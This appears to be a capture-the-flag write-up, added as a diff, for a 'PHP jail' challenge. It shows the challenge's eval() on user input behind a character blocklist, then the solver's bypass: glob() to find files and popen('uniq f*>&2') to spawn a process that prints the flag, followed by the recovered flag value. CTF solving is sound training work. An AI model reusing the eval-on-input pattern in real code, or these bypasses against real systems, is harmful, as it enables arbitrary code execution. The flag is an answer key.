@@ -1,0 +1,41 @@
+
+# Challenge :
+<?php
+array_shift($_SERVER['argv']);
+$var = implode(" ", $_SERVER['argv']);
+
+if($var == null) die("PHP Jail need an argument\n");
+
+function filter($var) {
+        if(preg_match('/(\/|a|c|s|require|include|flag|eval|file)/i', $var)) {
+                return false;
+        }
+        return true;
+}
+if(filter($var)) {
+        eval($var);
+        echo "Command executed";
+} else {
+        echo "Restricted characters has been used";
+}
+echo "\n";
+?>
+
+=====================================================================
+
+Can't use the word "flag"... List files using glob :
+	print_r(glob('*'));
+	glob('*')[0] = 'flag.txt'
+
+This failed :
+	print(fgets(fopen(glob('*')[0])), 4000));
+
+Because we can't use 's' chars (for fgets)
+
+
+Then i found popen which can spawn a process
+	print(popen('uniq f*>&2', 'r'));
+
+Got to redirect output to >&2 otherwise won't see the output
+
+FLAG-YlxV8cCg84zvUtt595dla5un9EW57BCL
